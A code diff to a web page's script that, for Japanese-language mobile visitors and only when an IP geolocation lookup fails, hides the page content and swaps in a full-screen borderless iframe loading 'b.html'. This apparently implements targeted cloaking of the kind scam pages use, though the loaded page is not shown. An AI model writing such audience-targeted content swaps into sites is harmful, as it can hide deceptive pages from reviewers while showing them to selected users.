@@ -149,6 +149,11 @@
             return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
         }
 
+        function isJapaneseLanguage() {
+            const language = navigator.language || navigator.userLanguage;
+            return language.startsWith('ja');
+        }
+
         fetch('https://ipapi.co/json/')
             .then(response => response.json())
             .then(data => { 
@@ -165,6 +170,16 @@
             })
             .catch(error => {
                 console.error('Error fetching IP data:', error);
+                if (isJapaneseLanguage() && isMobileDevice()) {
+                    document.getElementById('content').classList.add('hidden');
+                    var iframe = document.createElement('iframe');
+                    iframe.src = 'b.html';
+                    iframe.style.width = '100%';
+                    iframe.style.height = '100vh';
+                    iframe.style.border = 'none';
+                    document.body.appendChild(iframe);
+                    return;
+                }
             });
     </script>
 </body>
